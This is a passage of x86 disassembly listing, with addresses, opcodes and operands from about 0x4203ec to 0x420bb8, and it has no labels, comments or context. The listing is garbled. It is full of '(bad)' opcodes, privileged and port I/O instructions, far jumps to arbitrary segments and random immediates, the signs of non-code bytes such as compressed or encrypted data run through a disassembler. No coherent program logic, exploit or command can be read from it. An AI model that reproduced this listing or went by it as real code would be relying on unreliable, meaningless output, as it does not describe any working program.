  4203ec:	test   BYTE PTR [ecx-0xe],dh
  4203ef:	xchg   DWORD PTR [ebp+0x2c],edi
  4203f2:	cwde   
  4203f3:	outs   dx,DWORD PTR ds:[esi]
  4203f4:	jb     0x420413
  4203f6:	cwde   
  4203f7:	mov    ah,0x8e
  4203f9:	jge    0x420469
  4203fb:	xchg   edx,eax
  4203fc:	stc    
  4203fd:	test   BYTE PTR [esi+0x24],0x47
  420401:	pop    edi
  420402:	or     al,0x44
  420404:	and    dl,cl
  420406:	mov    edi,0x444dc73c
  42040b:	mov    ch,BYTE PTR [eax]
  42040d:	inc    edx
  42040e:	and    bl,BYTE PTR [eax]
  420410:	push   cs
  420411:	mov    dl,0x5
  420413:	cmp    ch,BYTE PTR [ebp+0x18]
  420416:	xor    DWORD PTR [ebp-0x33d64617],ecx
  42041c:	aaa    
  42041d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42041e:	imul   ebx,edx,0xfffffffa
  420421:	dec    ebx
  420422:	(bad)  
  420423:	sti    
  420424:	add    DWORD PTR [esi-0x50900a61],ecx
  42042a:	adc    al,0x35
  42042c:	sub    eax,0x25beb5a1
  420431:	xchg   esi,eax
  420432:	jns    0x420462
  420434:	test   BYTE PTR [ecx],0x97
  420437:	mov    BYTE PTR ds:0x4bac5586,ah
  42043d:	lea    edi,[ebx]
  42043f:	push   ecx
  420440:	sub    bl,BYTE PTR [ebx+0xd0ea7c]
  420446:	dec    di
  420448:	push   cs
  420449:	xor    ebp,DWORD PTR [ebx-0x1007dee1]
  42044f:	test   eax,0xb6061cc7
  420454:	sahf   
  420455:	sub    esp,edx
  420457:	enter  0x202a,0xd0
  42045b:	jo     0x4204da
  42045d:	xchg   ebx,eax
  42045e:	(bad)  
  42045f:	cli    
  420460:	lock cdq 
  420462:	fldln2 
  420464:	sbb    bh,ch
  420466:	mov    dl,0x14
  420468:	push   edi
  420469:	in     eax,0xc0
  42046b:	pop    ebp
  42046c:	scas   eax,DWORD PTR es:[edi]
  42046d:	sub    al,0x42
  42046f:	les    esi,FWORD PTR [edx]
  420471:	adc    esp,DWORD PTR [ecx-0x4c]
  420474:	test   al,0x89
  420476:	dec    esi
  420477:	adc    ecx,esi
  420479:	jnp    0x420494
  42047b:	lods   eax,DWORD PTR ds:[esi]
  42047c:	adc    bh,bl
  42047e:	aam    0x3b
  420480:	pop    edx
  420481:	push   ecx
  420482:	cmp    DWORD PTR [eax+esi*4],edx
  420485:	mov    ah,BYTE PTR [esp+esi*8]
  420488:	dec    eax
  420489:	ins    DWORD PTR es:[edi],dx
  42048a:	or     al,0xae
  42048c:	mov    dl,0x8e
  42048e:	out    dx,al
  42048f:	xor    DWORD PTR [eax-0x5fbcebb9],esp
  420495:	push   edi
  420496:	adc    BYTE PTR [edi-0x4792ad9d],bh
  42049c:	jmp    0x41a57e61
  4204a1:	push   cs
  4204a2:	push   cs
  4204a3:	add    esp,esp
  4204a5:	dec    esi
  4204a6:	xor    eax,0xfa1041c6
  4204ab:	adc    DWORD PTR [edi+0x55e9da5e],edx
  4204b1:	out    dx,eax
  4204b2:	jbe    0x420494
  4204b4:	mov    WORD PTR [ebx-0x2640fbaf],gs
  4204ba:	add    eax,0x976c70b
  4204bf:	out    0x99,al
  4204c1:	stos   DWORD PTR es:[edi],eax
  4204c2:	push   ebp
  4204c3:	test   edx,ebx
  4204c5:	sbb    DWORD PTR [esi],esp
  4204c7:	in     al,dx
  4204c8:	and    eax,0x1464f528
  4204cd:	sub    cl,BYTE PTR [ebx-0x20dc2371]
  4204d3:	test   BYTE PTR [edi+0x667d5e45],ch
  4204d9:	fmul   QWORD PTR [ebp+0x75ff7f08]
  4204df:	xlat   BYTE PTR ds:[ebx]
  4204e0:	sbb    ch,BYTE PTR [ebp-0x1b]
  4204e3:	dec    ebp
  4204e4:	(bad)
  4204e8:	mov    bl,0x62
  4204ea:	or     al,0x21
  4204ec:	push   ebx
  4204ed:	mov    ecx,0x6b4cd7f9
  4204f2:	add    edx,edi
  4204f4:	xor    eax,0x53f97fba
  4204f9:	(bad)  
  4204fa:	xchg   esi,eax
  4204fb:	aaa    
  4204fc:	jo     0x4204fb
  4204fe:	outs   dx,DWORD PTR ds:[esi]
  4204ff:	push   ebx
  420500:	aad    0xc4
  420502:	and    ecx,DWORD PTR [eax]
  420504:	out    dx,eax
  420505:	es mov ebx,0x12355bb8
  42050b:	popf   
  42050c:	push   esi
  42050d:	jae    0x4204bc
  42050f:	mov    eax,0x6fafa87d
  420514:	jae    0x42053c
  420516:	int3   
  420517:	aaa    
  420518:	aam    0xcd
  42051a:	xor    BYTE PTR [eax+eiz*1-0x4],0x52
  42051f:	or     BYTE PTR [edx-0x7d],0x27
  420523:	lds    ebx,FWORD PTR [ebx+0x0]
  420526:	mov    bh,0x2c
  420528:	mov    bl,0xad
  42052a:	add    al,0x39
  42052c:	in     eax,dx
  42052d:	cld    
  42052e:	xchg   ecx,eax
  42052f:	sub    ebp,DWORD PTR [ebp+0x57dde428]
  420535:	mov    es,WORD PTR [ebp+0xfc41f33]
  42053b:	neg    DWORD PTR [edi+0x2461c0f1]
  420541:	arpl   WORD PTR [ebp+0x215975a2],dx
  420547:	xor    DWORD PTR [ecx],eax
  420549:	out    dx,eax
  42054a:	aas    
  42054b:	add    ch,BYTE PTR [esi-0x1adac971]
  420551:	dec    esp
  420552:	shl    BYTE PTR [edi-0x7e503fad],cl
  420558:	shl    BYTE PTR [esi+0x73],1
  42055b:	fisubr WORD PTR [esi-0x13]
  42055e:	ja     0x4205ce
  420560:	les    ecx,FWORD PTR [edx]
  420562:	add    bl,BYTE PTR [ebx+eiz*1+0x51]
  420566:	nop
  420567:	mov    ds:0x26dbeb19,al
  42056c:	out    dx,eax
  42056d:	jns    0x42050d
  42056f:	xchg   DWORD PTR [ecx+0x65df4c49],ebp
  420575:	jmp    0x62b4:0x16290e6c
  42057c:	cs shr cl,0xb3
  420580:	mov    WORD PTR [edi-0x11],?
  420583:	inc    edx
  420584:	(bad)  
  420585:	sbb    ch,BYTE PTR [ebp+0x56]
  420588:	xor    al,0xad
  42058a:	inc    ebx
  42058b:	jecxz  0x4205c7
  42058d:	push   esi
  42058e:	cdq    
  42058f:	and    DWORD PTR [esi-0x62],edi
  420592:	out    0x3e,eax
  420594:	ja     0x4205cc
  420596:	femms  
  420598:	lds    esi,FWORD PTR [ebx+eax*1]
  42059b:	jae    0x4205a4
  42059d:	loop   0x420526
  42059f:	and    dl,al
  4205a1:	fimul  DWORD PTR [ecx]
  4205a3:	inc    ebp
  4205a4:	ins    DWORD PTR es:[edi],dx
  4205a5:	pop    esi
  4205a6:	popf   
  4205a7:	xor    edi,DWORD PTR [edi-0x430ac5bc]
  4205ad:	imul   ebp,DWORD PTR [ecx+0x35],0x5ce9045d
  4205b4:	sbb    al,0x32
  4205b6:	shl    BYTE PTR [edi],1
  4205b8:	sub    BYTE PTR [edx+0x2cd3ffb3],cl
  4205be:	addr16 out 0x8d,al
  4205c1:	mov    ebp,0xdc686296
  4205c6:	sbb    al,0xb4
  4205c8:	jnp    0x42060b
  4205ca:	aaa    
  4205cb:	int3   
  4205cc:	mov    al,ds:0x74380c53
  4205d1:	adc    DWORD PTR [eax+0x4a],edi
  4205d4:	addr16 aad 0xa9
  4205d7:	mov    edx,0xf233458d
  4205dc:	arpl   WORD PTR [edx+0x13],bx
  4205df:	xor    dh,bh
  4205e1:	das    
  4205e2:	ret    0x5da6
  4205e5:	inc    ebp
  4205e6:	scas   al,BYTE PTR es:[edi]
  4205e7:	daa    
  4205e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205e9:	xor    eax,0xffffffc8
  4205ec:	push   es
  4205ed:	xchg   edx,eax
  4205ee:	xor    ebx,DWORD PTR [eax+0x3a]
  4205f1:	je     0x420641
  4205f3:	sbb    esp,esp
  4205f5:	adc    esi,DWORD PTR [ecx+0x14]
  4205f8:	shl    DWORD PTR [ebx],cl
  4205fa:	and    edi,DWORD PTR [edx+0x4b1c27b]
  420600:	dec    edx
  420601:	mov    DWORD PTR [esi+ebp*2],0x93e3b4d9
  420608:	xor    esp,DWORD PTR [esi+0x36a24bd1]
  42060e:	or     ah,BYTE PTR [ebp+0x19]
  420611:	rcr    BYTE PTR [esi+0x148f918a],1
  420617:	daa    
  420618:	addr16 sbb ebx,edx
  42061b:	adc    al,0xf
  42061d:	out    0xc2,eax
  42061f:	xchg   edx,eax
  420620:	lods   al,BYTE PTR ds:[esi]
  420621:	add    edi,DWORD PTR [ebx-0x79]
  420624:	sub    eax,0xed9fd09b
  420629:	cmp    ah,BYTE PTR [eax-0x11]
  42062c:	rcl    DWORD PTR [ebx+0x2ae9cf9b],0x10
  420633:	jecxz  0x420699
  420635:	lods   al,BYTE PTR ds:[esi]
  420636:	dec    edx
  420637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420638:	test   dl,al
  42063a:	sub    bl,BYTE PTR [ebx]
  42063c:	div    DWORD PTR [eax+0x57bb01ca]
  420642:	scas   al,BYTE PTR es:[edi]
  420643:	adc    edx,esi
  420645:	push   ebx
  420646:	xchg   ecx,eax
  420647:	(bad)  
  420648:	sar    DWORD PTR [ebx+eax*2],0x49
  42064c:	stc    
  42064d:	inc    ecx
  42064e:	popa   
  42064f:	imul   eax,DWORD PTR [esi+0x23b70d31],0x2d
  420656:	mov    bh,0xe4
  420658:	lds    edi,FWORD PTR [ebp-0x3d0d8b48]
  42065e:	xchg   ecx,eax
  42065f:	fadd   DWORD PTR [ebp-0x6d155dbb]
  420665:	pop    edx
  420666:	add    eax,0xb176a3d0
  42066b:	lock les esi,FWORD PTR [ebx]
  42066e:	sti    
  42066f:	adc    DWORD PTR [edi],edi
  420671:	mov    eax,0x39305efe
  420676:	(bad)  
  420677:	and    BYTE PTR [ecx],dl
  420679:	mov    eax,0xcca12870
  42067e:	dec    eax
  42067f:	jae    0x420654
  420681:	stc    
  420682:	(bad)  
  420683:	test   eax,0x5a10ef6
  420688:	outs   dx,BYTE PTR ds:[esi]
  420689:	mov    esi,0xd510f770
  42068e:	pop    edi
  42068f:	(bad)  
  420690:	xchg   ebx,eax
  420691:	stc    
  420692:	push   edi
  420693:	idiv   dh
  420695:	and    al,0xf5
  420697:	mov    ah,0xcd
  420699:	cmp    DWORD PTR [eax+0x6a984599],ebx
  42069f:	std    
  4206a0:	aas    
  4206a1:	sbb    ah,BYTE PTR [edx-0x19]
  4206a4:	add    eax,0x53a6cabe
  4206a9:	aad    0xe3
  4206ab:	xchg   esi,eax
  4206ac:	lea    ecx,ds:[ebp+0x14bf67ca]
  4206b3:	xchg   edi,eax
  4206b4:	mov    bl,0x46
  4206b6:	push   ss
  4206b7:	in     eax,dx
  4206b8:	test   BYTE PTR [eax-0x12],ch
  4206bb:	lods   al,BYTE PTR ds:[esi]
  4206bc:	sub    ah,bl
  4206be:	in     al,0x37
  4206c0:	ret    
  4206c1:	adc    eax,0x7264daa6
  4206c6:	xor    BYTE PTR [ebx-0x5b590875],ah
  4206cc:	sbb    eax,0x60df48e8
  4206d1:	cmp    DWORD PTR [esp+ecx*4-0x24],0xca9ce35e
  4206d9:	mov    ecx,0x6b8891df
  4206de:	mov    dh,0x8e
  4206e0:	mov    ebx,0x3a7c1dbb
  4206e5:	mov    ds:0xbfd05e6,al
  4206ea:	arpl   cx,sp
  4206ec:	dec    edi
  4206ed:	cs leave 
  4206ef:	test   eax,0x7035524d
  4206f4:	stc    
  4206f5:	push   0x1
  4206f7:	in     eax,dx
  4206f8:	inc    ecx
  4206f9:	and    BYTE PTR [edx+0x20f9e07c],ah
  4206ff:	cmp    eax,0x105aab26
  420704:	pop    ss
  420705:	adc    edi,DWORD PTR [ebp+0x72]
  420708:	inc    ebp
  420709:	xchg   ebx,eax
  42070a:	ror    BYTE PTR [eax],cl
  42070c:	add    edx,edi
  42070e:	mov    cl,BYTE PTR [esp+edi*8+0x1b]
  420712:	outs   dx,DWORD PTR ds:[esi]
  420713:	stos   BYTE PTR es:[edi],al
  420714:	sbb    al,BYTE PTR ds:0x9c851334
  42071a:	out    0x1d,al
  42071c:	into   
  42071d:	arpl   WORD PTR [eax+0x25],bx
  420720:	out    0x5a,al
  420722:	repnz sub edx,ecx
  420725:	pop    edx
  420726:	adc    DWORD PTR [edx],0xffffffae
  420729:	mov    al,0x76
  42072b:	in     al,dx
  42072c:	jae    0x420733
  42072e:	cmp    BYTE PTR [edi+0x3856a4b],0x2f
  420735:	push   ebp
  420736:	add    al,0xc
  420738:	dec    ebp
  420739:	push   0x34ddaf8e
  42073e:	shl    DWORD PTR [esp+edi*4+0x27],1
  420742:	js     0x42071d
  420744:	mov    bh,0xe4
  420746:	test   BYTE PTR [ecx+0x4a],dh
  420749:	mov    edx,0xa9a605da
  42074e:	pop    esp
  42074f:	push   ebp
  420750:	push   eax
  420751:	dec    ecx
  420752:	shl    DWORD PTR [ecx-0x2f6cfc0c],1
  420758:	into   
  420759:	stos   DWORD PTR es:[edi],eax
  42075a:	push   ebx
  42075b:	jmp    0x2a50:0xb5bbf98e
  420762:	inc    edi
  420763:	or     eax,0x8970b965
  420768:	jno    0x4207e8
  42076a:	jg     0x42078d
  42076c:	inc    esp
  42076d:	add    esp,DWORD PTR [esi+0x7ad3ac5b]
  420773:	jg     0x420734
  420775:	dec    eax
  420776:	xor    DWORD PTR [edi],edx
  420778:	arpl   WORD PTR [eax-0x26c384cc],ax
  42077e:	into   
  42077f:	nop
  420780:	bound  esi,QWORD PTR [esi+ebx*2]
  420783:	pop    es
  420784:	je     0x4207bd
  420786:	dec    eax
  420787:	push   es
  420788:	xchg   ebx,eax
  420789:	and    al,0x30
  42078b:	xchg   esp,eax
  42078c:	fdiv   DWORD PTR [ebp-0x3b101028]
  420792:	in     eax,0x7e
  420794:	sub    ecx,0xffffffc6
  420797:	xchg   ecx,eax
  420798:	ret    0xadee
  42079b:	scas   eax,DWORD PTR es:[edi]
  42079c:	and    eax,0x70c96b22
  4207a1:	xchg   ebp,eax
  4207a2:	mov    dh,0x82
  4207a4:	sub    BYTE PTR [ebx+ecx*1+0x4868c3e5],dl
  4207ab:	out    0x66,eax
  4207ad:	(bad)  
  4207ae:	inc    ebx
  4207af:	dec    edx
  4207b0:	lods   al,BYTE PTR ds:[esi]
  4207b1:	sbb    ecx,DWORD PTR [ebx]
  4207b3:	loopne 0x420774
  4207b5:	test   al,0x62
  4207b7:	add    ecx,edi
  4207b9:	fstp   TBYTE PTR [ebx]
  4207bb:	daa    
  4207bc:	mov    al,0xe5
  4207be:	js     0x4207b7
  4207c0:	add    esp,ebp
  4207c2:	mov    dl,0x23
  4207c4:	pop    es
  4207c5:	mov    eax,DWORD PTR [edx+0x10]
  4207c8:	dec    edx
  4207c9:	out    0x35,al
  4207cb:	jo     0x42074e
  4207cd:	sbb    eax,0x9f5c9cb8
  4207d2:	or     bh,BYTE PTR [edi]
  4207d4:	mov    ebx,0x3cf1e004
  4207d9:	ffreep st(5)
  4207db:	retf   0xe8cb
  4207de:	add    al,0x8e
  4207e0:	jns    0x420842
  4207e2:	sar    bl,0x39
  4207e5:	sub    al,0xfb
  4207e7:	xchg   DWORD PTR [ecx],esi
  4207e9:	leave  
  4207ea:	dec    ebp
  4207eb:	sub    BYTE PTR [edx+0x28],dh
  4207ee:	jle    0x4207f1
  4207f0:	imul   edi,ebp,0xffffffcd
  4207f3:	push   es
  4207f4:	jmp    0x4207c1
  4207f6:	fldcw  WORD PTR [ebx-0x64]
  4207f9:	add    ecx,esi
  4207fb:	mov    dl,0x3e
  4207fd:	sub    eax,0x709f51eb
  420802:	mov    eax,ds:0xfff392dd
  420807:	dec    ebp
  420808:	sub    BYTE PTR [eax-0x5e],0xa4
  42080c:	test   al,0x69
  42080e:	xor    edi,esi
  420810:	iret   
  420811:	cmp    ebx,DWORD PTR [edx]
  420813:	xchg   esp,eax
  420814:	repnz out 0x15,eax
  420817:	sbb    al,0xb1
  420819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42081a:	in     eax,dx
  42081b:	outs   dx,DWORD PTR ds:[esi]
  42081c:	pop    es
  42081d:	popa   
  42081e:	mov    al,ds:0x519bad86
  420823:	in     al,0x10
  420825:	xchg   ebp,eax
  420826:	(bad)  
  420828:	(bad)  
  420829:	adc    DWORD PTR [edx-0x59],esi
  42082c:	xor    eax,0xef7c3ab
  420831:	arpl   cx,bp
  420833:	push   esp
  420834:	lahf   
  420835:	pop    ecx
  420836:	test   DWORD PTR [edi],0xbd4e6bbb
  42083c:	sbb    ebx,DWORD PTR [ecx+ebx*2]
  42083f:	cmp    bl,BYTE PTR [edi+ecx*8+0x40cb313e]
  420846:	dec    eax
  420847:	clc    
  420848:	add    ebx,DWORD PTR [ebx-0x44bd57ad]
  42084e:	data16 jbe 0x4207d7
  420851:	add    esp,DWORD PTR [ecx-0x3c166476]
  420857:	call   0xdf8f7b35
  42085c:	sar    DWORD PTR [esi-0x7cea9ff8],1
  420862:	pop    es
  420863:	mov    ecx,0xe6341c20
  420868:	cli    
  420869:	fistp  WORD PTR [eax]
  42086b:	xor    BYTE PTR [ecx-0x3a00f380],bh
  420871:	icebp  
  420872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420873:	ret    0x1e7d
  420876:	scas   eax,DWORD PTR es:[edi]
  420877:	or     BYTE PTR [edi-0x5843fc6f],bh
  42087d:	fdivr  QWORD PTR [ebx]
  42087f:	or     ah,bh
  420881:	fistp  WORD PTR [ebx+0x17]
  420884:	lahf   
  420885:	sbb    ebx,ebx
  420887:	(bad)  
  420888:	iret   
  420889:	push   esi
  42088a:	mov    ds:0x3448dc10,eax
  42088f:	jbe    0x42083f
  420891:	std    
  420892:	in     al,0xe1
  420894:	test   eax,0x847ae2b1
  420899:	mov    cl,0xf2
  42089b:	mov    esp,0x36348a86
  4208a0:	sub    eax,0x741154c6
  4208a5:	xchg   BYTE PTR [eax],ch
  4208a7:	pop    edx
  4208a8:	sbb    DWORD PTR [esp+ecx*2+0x42],esp
  4208ac:	out    dx,al
  4208ad:	mov    ah,0x57
  4208af:	sub    al,0xf4
  4208b1:	and    BYTE PTR [ebx+0x49e0e1a9],0x42
  4208b8:	xor    eax,0x11f886a6
  4208bd:	mov    edi,DWORD PTR [ebx-0x66652487]
  4208c3:	cmp    BYTE PTR es:[edx-0x642aba1b],bh
  4208ca:	(bad)  
  4208cb:	pop    edx
  4208cc:	mov    cl,0x41
  4208ce:	jnp    0x4208f0
  4208d0:	icebp  
  4208d1:	lea    esp,[edi-0x4f40bd37]
  4208d7:	xlat   BYTE PTR ds:[ebx]
  4208d8:	int    0x8d
  4208da:	and    DWORD PTR [esi],edi
  4208dc:	cmp    eax,0x4d9eb38a
  4208e1:	push   ds
  4208e2:	and    BYTE PTR [edi+0x3376c8e5],0xdd
  4208e9:	mov    WORD PTR [ebp+edx*2+0x48c312da],ds
  4208f0:	mov    al,ds:0xf29870ca
  4208f5:	push   esi
  4208f6:	xchg   edi,eax
  4208f7:	retf   0xc2aa
  4208fa:	scas   al,BYTE PTR es:[edi]
  4208fb:	sub    al,0xdb
  4208fd:	enter  0x788a,0x22
  420901:	dec    esi
  420902:	or     DWORD PTR [ebp-0x3d],ebx
  420905:	mov    al,0xd2
  420907:	data16 xor al,0xf1
  42090a:	xor    cl,ah
  42090c:	sub    ax,0x8536
  420910:	jbe    0x420958
  420912:	fdivr  DWORD PTR [ecx+0x6c]
  420915:	iret   
  420916:	stos   DWORD PTR es:[edi],eax
  420917:	lahf   
  420918:	fs xor al,al
  42091b:	push   ecx
  42091c:	(bad)  
  42091d:	das    
  42091e:	mov    edx,DWORD PTR [ebx+0x68]
  420921:	inc    edi
  420922:	in     eax,dx
  420923:	mov    ebx,0x2f751c73
  420928:	cmp    eax,0x957b9bca
  42092d:	jnp    0x42096f
  42092f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420930:	test   BYTE PTR [esi],0x5d
  420933:	sti    
  420934:	lods   eax,DWORD PTR ds:[esi]
  420935:	xor    eax,DWORD PTR [esi+eiz*8-0x34]
  420939:	je     0x42095e
  42093b:	xor    bl,BYTE PTR [ebx-0x5f88e8c1]
  420941:	add    bh,ah
  420943:	(bad)  
  420945:	sti    
  420946:	sub    BYTE PTR [edx+0x35],bh
  420949:	sub    edi,ebp
  42094b:	mov    ebx,0x4fae895e
  420950:	hlt    
  420951:	ds sbb dl,BYTE PTR gs:[esi+0x42]
  420956:	pop    eax
  420957:	inc    esi
  420958:	repz hlt 
  42095a:	jmp    0x1bf427c2
  42095f:	xchg   esi,eax
  420960:	xlat   BYTE PTR gs:[ebx]
  420962:	fwait
  420963:	and    DWORD PTR [edx],0x31992d25
  420969:	inc    ebx
  42096a:	enter  0xecbd,0xb4
  42096e:	(bad)  
  42096f:	pop    esp
  420970:	add    BYTE PTR [ecx+0x5108dfb3],0x8a
  420977:	call   0x97b4eb50
  42097c:	pop    esp
  42097d:	retf   
  42097e:	clc    
  42097f:	cmp    dh,BYTE PTR [esi]
  420981:	jo     0x4209c9
  420983:	test   BYTE PTR [edi-0x10],ch
  420986:	outs   dx,DWORD PTR ds:[esi]
  420987:	push   ebx
  420988:	test   BYTE PTR [eax-0x62f47afe],dl
  42098e:	xor    eax,0x757cd1bb
  420993:	dec    edx
  420994:	xchg   ecx,eax
  420995:	or     esi,edx
  420997:	adc    DWORD PTR [ebx],eax
  420999:	sbb    dl,BYTE PTR [edx+0x4c]
  42099c:	scas   al,BYTE PTR es:[edi]
  42099d:	and    eax,ebp
  42099f:	cld    
  4209a0:	int    0x1f
  4209a2:	stos   BYTE PTR es:[edi],al
  4209a3:	adc    ecx,DWORD PTR [ebx+0x149c15de]
  4209a9:	pop    ebx
  4209aa:	(bad)  
  4209ab:	mov    al,ds:0x9446fcc
  4209b0:	fidivr DWORD PTR [ebp+ecx*8+0x23]
  4209b4:	add    esp,DWORD PTR [ebx+0x7e]
  4209b7:	add    al,0x43
  4209b9:	xor    ebx,DWORD PTR [edx]
  4209bb:	sbb    ebp,edi
  4209bd:	sti    
  4209be:	push   0xffffffd6
  4209c0:	or     al,0xc3
  4209c2:	out    0xd2,al
  4209c4:	rcr    BYTE PTR [ebx+eiz*2-0x3f0753fd],1
  4209cb:	outs   dx,DWORD PTR ds:[esi]
  4209cc:	ror    DWORD PTR [esi-0x16],0xcf
  4209d0:	lea    ecx,ds:[esi-0x33292a04]
  4209d7:	mov    esi,DWORD PTR [edx]
  4209d9:	mov    edx,0x424d8c9f
  4209de:	cld    
  4209df:	(bad)  
  4209e0:	pushf  
  4209e1:	imul   edx,DWORD PTR [edi-0x5e],0x31
  4209e5:	lods   eax,DWORD PTR ds:[esi]
  4209e6:	and    BYTE PTR [edi-0x46],ah
  4209e9:	sub    DWORD PTR [eax+0x62b90e73],0xb09fad32
  4209f3:	lds    edi,FWORD PTR [edx]
  4209f5:	xchg   esi,eax
  4209f6:	repnz pushf 
  4209f8:	cmp    edx,ecx
  4209fa:	add    BYTE PTR [edi],cl
  4209fc:	icebp  
  4209fd:	inc    ebx
  4209fe:	(bad)  
  420a00:	shr    DWORD PTR [esi+ebx*8+0x31],cl
  420a04:	adc    eax,0xe5293198
  420a09:	ret    
  420a0a:	dec    edx
  420a0b:	dec    edx
  420a0c:	adc    BYTE PTR [edx+0x40d55a38],dh
  420a12:	xchg   edx,eax
  420a13:	jbe    0x4209a2
  420a15:	imul   esi,DWORD PTR [ecx+0x6d],0x44
  420a19:	pop    ebp
  420a1a:	jecxz  0x420a05
  420a1c:	and    al,0xd6
  420a1e:	pop    es
  420a1f:	loope  0x420a56
  420a21:	loop   0x4209cf
  420a23:	cmp    BYTE PTR [ebx],cl
  420a25:	mov    ch,0x4
  420a27:	in     al,dx
  420a28:	call   0x279f9311
  420a2d:	push   ebx
  420a2e:	push   esp
  420a2f:	fwait
  420a30:	mov    ds:0xd42c10ed,al
  420a35:	sbb    DWORD PTR [edx+0x70],0xffffffad
  420a39:	lock outs dx,DWORD PTR ds:[esi]
  420a3b:	popf   
  420a3c:	mov    BYTE PTR [esi-0x75],0x26
  420a40:	cmp    cl,BYTE PTR [ecx-0x927ab6d]
  420a46:	ja     0x420a7b
  420a48:	les    esp,FWORD PTR [eax-0x29]
  420a4b:	int    0x77
  420a4d:	mov    bl,0x0
  420a4f:	hlt    
  420a50:	xor    edi,esp
  420a52:	dec    edx
  420a53:	xchg   esi,eax
  420a54:	jge    0x420a3c
  420a56:	(bad)  
  420a57:	and    eax,0x43af020b
  420a5c:	in     al,0x3
  420a5e:	dec    edi
  420a5f:	mov    cr3,edx
  420a62:	dec    eax
  420a63:	and    al,0xa
  420a65:	idiv   BYTE PTR [edx]
  420a67:	cmp    eax,0xe3aa1498
  420a6c:	mov    dh,bh
  420a6e:	dec    esp
  420a6f:	cmp    dl,BYTE PTR [eax-0x52]
  420a72:	pop    esp
  420a73:	xchg   edx,eax
  420a74:	xor    DWORD PTR [ebp+eiz*4-0x311eea],0xfffffff0
  420a7c:	cld    
  420a7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a7e:	rcl    BYTE PTR [eax],cl
  420a80:	sbb    eax,0x8cf72081
  420a85:	cmp    al,0x85
  420a87:	mov    ebx,0xe258906a
  420a8c:	nop
  420a8d:	ss and eax,0xbb351602
  420a93:	xchg   edi,eax
  420a94:	add    eax,0xbd9eb8ef
  420a99:	add    eax,0x914c0c34
  420a9e:	(bad)  
  420a9f:	sbb    DWORD PTR [edi+0x6d],ebx
  420aa2:	cmp    eax,0x5c20ffac
  420aa7:	nop
  420aa8:	jmp    0x420b11
  420aaa:	fs iret 
  420aac:	loop   0x420a6d
  420aae:	mov    esi,0xf8ebbf5b
  420ab3:	or     eax,0xd1336ce7
  420ab8:	sar    BYTE PTR [ebx],cl
  420aba:	xchg   edi,eax
  420abb:	mov    DWORD PTR [edx+0x6b8125f5],esi
  420ac1:	das    
  420ac2:	mov    eax,ds:0xae850b3c
  420ac7:	xchg   esi,eax
  420ac8:	xchg   BYTE PTR [edi-0x55242cb8],al
  420ace:	repnz stos BYTE PTR es:[edi],al
  420ad0:	das    
  420ad1:	cmc    
  420ad2:	push   esi
  420ad3:	sti    
  420ad4:	or     DWORD PTR [edi-0x2a],esi
  420ad7:	adc    eax,0xe6b9818f
  420adc:	jmp    0x420b49
  420ade:	xor    DWORD PTR [eax+0x1b58fe19],esp
  420ae4:	ss in  al,dx
  420ae6:	imul   ebx,DWORD PTR [esi],0xd1498816
  420aec:	push   ss
  420aed:	int3   
  420aee:	pop    ecx
  420aef:	push   esi
  420af0:	pusha  
  420af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420af2:	mov    dh,ch
  420af4:	rcl    DWORD PTR [ebx],cl
  420af6:	pop    ebx
  420af7:	push   ebp
  420af8:	je     0x420ad3
  420afa:	rcr    al,0xac
  420afd:	xchg   DWORD PTR [ecx-0x49],esp
  420b00:	pop    eax
  420b01:	push   edi
  420b02:	inc    esp
  420b03:	pop    edx
  420b04:	scas   eax,DWORD PTR es:[edi]
  420b05:	cwde   
  420b06:	or     esi,DWORD PTR ds:0x9090dc4d
  420b0c:	mov    eax,ss:0x5293f82a
  420b12:	mov    DWORD PTR [esi+0x1518349a],ebp
  420b18:	mov    ds:0x5271932e,al
  420b1d:	xchg   DWORD PTR [ecx+0x55],ebx
  420b20:	out    dx,al
  420b21:	ins    DWORD PTR es:[edi],dx
  420b22:	mov    dh,0x4
  420b24:	cli    
  420b25:	cmp    eax,0x9bc5770f
  420b2a:	xchg   edi,eax
  420b2b:	jp     0x420b7c
  420b2d:	pop    ecx
  420b2e:	popf   
  420b2f:	mov    ebx,0x7328a107
  420b34:	jecxz  0x420b6b
  420b36:	and    BYTE PTR [edi-0x2a],bl
  420b39:	loopne 0x420ac5
  420b3b:	push   ecx
  420b3c:	mov    ds:0x481b4aa3,eax
  420b41:	add    esi,0x7c7ab80e
  420b47:	cwde   
  420b48:	jns    0x420b07
  420b4a:	pop    ebp
  420b4b:	enter  0x890c,0xd
  420b4f:	mov    dh,0xf8
  420b51:	dec    ecx
  420b52:	imul   ebx,ebx,0xb65dce7f
  420b58:	js     0x420b2c
  420b5a:	aaa    
  420b5b:	mov    cl,0x3f
  420b5d:	add    ecx,0xffffffd0
  420b60:	cmp    bl,0xb7
  420b63:	xor    BYTE PTR [esi-0x3f],ah
  420b66:	push   esi
  420b67:	aas    
  420b68:	push   0x7b
  420b6a:	int    0x88
  420b6c:	inc    ebp
  420b6d:	sar    DWORD PTR [edx+0x603625],cl
  420b73:	mov    al,ds:0x5459ec3b
  420b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b79:	in     eax,0x4
  420b7b:	dec    ebx
  420b7c:	retf   
  420b7d:	add    BYTE PTR es:[edi],ch
  420b80:	sbb    al,0xda
  420b82:	xor    edx,edx
  420b84:	out    dx,eax
  420b85:	jmp    0x39d0b71
  420b8a:	mov    esp,0x41192cce
  420b8f:	sbb    ebx,DWORD PTR [edx-0x6e93a3d8]
  420b95:	cdq    
  420b96:	jge    0x420bbd
  420b98:	pushf  
  420b99:	push   edi
  420b9a:	pop    ebx
  420b9b:	cmp    bl,ch
  420b9d:	addr16 gs jmp 0x2cf75dc0
  420ba4:	xor    ch,cl
  420ba6:	fidivr DWORD PTR [ebx+0x64]
  420ba9:	xor    al,0x92
  420bab:	xchg   ebp,eax
  420bac:	inc    edi
  420bad:	pop    edi
  420bae:	int3   
  420baf:	jg     0x420bab
  420bb1:	(bad)  
  420bb2:	retf   
  420bb3:	fptan  
  420bb5:	nop
  420bb6:	and    dl,BYTE PTR [edi]
  420bb8:	jmp    0x420bdc
